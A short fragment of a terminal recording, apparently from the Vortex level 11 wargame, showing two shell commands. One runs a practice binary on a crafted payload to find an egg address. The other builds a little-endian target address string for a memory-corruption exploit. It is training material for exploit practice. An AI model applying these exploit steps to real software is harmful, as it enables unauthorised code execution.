[341.003517, "o", "EA=$(./h11 \"$(cat craft.bin)\" \"BBBBBBBBBBBBBBB\"); echo \"EGG at $EA\"\r\r\n\u001b[?2004l\r\u001b]3008;start=7f32d95e-d71b-4c82-a179-62e39c83b1a1;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex11;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp\u001b\\EGG at 0xffffd7d7\r\r\n\u001b]3008;end=7f32d95e-d71b-4c82-a179-62e39c83b1a1;exit=success\u001b\\\u001b]3008;start=08163262-6a91-4bfd-b6b0-3701b93297ce;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex11;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp\u001b\\\u001b[?2004h\u001b]0;vortex11@vortex: /tmp\u0007vortex11@vortex:/tmp$ "]
[360.677125, "o", "TGT=$(( EA + 1024 )); L=$((TGT & 255)); B1=$(((TGT>>8)&255)); B2=$(((TGT>>16)&255)); B3=$(((TGT>>24)&255)); if [ \"$L\" -eq 0 ]; then TGT=$((TGT+1)); L=$((TGT & 255)); fi; HX=$(printf '%02x%02x%02x%02x' $L $B1 $B2 $B3); A2=\"$(printf \"\\x${HX:0:2}\\x${HX:2:2}\\x${HX:4:2}\\x${HX:6:2}BBBBBBBBBBB\")\"; echo \"TGT=$TGT HX=$HX\"\r\r\n\u001b[?2004l\r\u001b]3008;start=1258e74e-bbe4-42a7-8072-4822086389ae;type=command;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex11;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp\u001b\\TGT=4294958039 HX=d7dbffff\r\r\n\u001b]3008;end=1258e74e-bbe4-42a7-8072-4822086389ae;exit=success\u001b\\\u001b]3008;start=08163262-6a91-4bfd-b6b0-3701b93297ce;type=shell;machineid=ec21caf08cfdfe937b9cee1512c61281;user=vortex11;hostname=gibson-0;bootid=7b3c318e-e0a3-4e72-9221-931949256b86;pid=3;cwd=/tmp\u001b\\\u001b[?2004h\u001b]0;vortex11@vortex: /tmp\u0007vortex11@vortex:/tmp$ "]
